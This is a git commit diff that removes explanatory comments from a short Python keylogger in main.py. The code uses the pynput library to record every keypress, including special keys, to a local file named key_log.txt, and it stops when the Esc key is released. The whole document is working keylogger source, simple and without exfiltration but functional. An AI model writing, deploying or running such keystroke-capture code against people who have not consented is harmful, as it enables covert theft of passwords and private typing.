ea7dc24374867a72a927942d9b69b09b7a4d7a45
Ayush Kumar <57131300+ojha13291@users.noreply.github.com>
2025-05-19 16:22:05 +0530

    Update main.py

--- main.py
+++ main.py
@@ -1,25 +1,17 @@
 import pynput
 from pynput.keyboard import Key, Listener
 
-# File to save keystrokes
 log_file = "key_log.txt"
 
-# Function to log the keystrokes
 def on_press(key):
     try:
-        # Record the key pressed
         with open(log_file, "a") as f:
             f.write(f"{key.char}")
     except AttributeError:
-        # Handle special keys
         with open(log_file, "a") as f:
             f.write(f" {str(key)} ")
-
-# Stop the keylogger when the 'Esc' key is pressed
 def on_release(key):
     if key == Key.esc:
         return False
-
-# Start listening to keyboard events
 with Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
